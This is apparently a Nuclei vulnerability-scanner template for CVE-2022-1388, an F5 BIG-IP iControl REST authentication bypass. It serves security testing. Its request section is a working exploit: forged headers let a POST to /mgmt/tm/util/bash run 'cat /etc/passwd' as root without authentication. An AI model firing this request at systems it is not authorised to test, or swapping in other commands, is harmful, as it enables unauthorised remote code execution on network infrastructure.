id: CVE-2022-1388

info:
  name: F5 BIG-IP Unauth RCE (CVE-2022-1388) 
  author: felmoltor
  severity: critical
  description: |
    Remote Code Execution in F5 BIG-IP. On F5 BIG-IP 16.1.x versions prior to 16.1.2.2, 15.1.x versions prior to 15.1.5.1, 14.1.x versions prior to 14.1.4.6, 13.1.x versions prior to 13.1.5, and all 12.1.x and 11.6.x versions, undisclosed requests may bypass iControl REST authentication. Software versions which have reached End of Technical Support (EoTS) are not evaluated
     reference:
    - https://twitter.com/jas502n/status/1523611433938059265
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388
    - https://support.f5.com/csp/article/K23605346
    - https://twitter.com/BursaMatus/status/1523572416152481793
  metadata:
  tags: cve,cve2022,big-ip,f5,loadbalancer
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H 
    cvss-score: 9.8
    cve-id: CVE-2022-1388
    cwe-id: CWE-287

requests:
  - method: POST
    path:
      - '{{BaseURL}}/mgmt/tm/util/bash'
    headers:
        Connection: "keep-alive,X-F5-Auth-Token,X-Forwarded-For,Local-Ip-From-Httpd,X-F5-New-Authok-Reqd,X-Forwarded-Server,X-Forwarded-Host"
        Authorization: Basic YWRtaW46
        X-F5-Auth-Token: XXXX

        User-Agent: Your-Friendly-Scanner/1.0
    body:
        "{\"command\":\"run\",\"utilCmdArgs\":\"-c 'cat /etc/passwd'\"}"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:'

      - type: status
        status:
          - 200
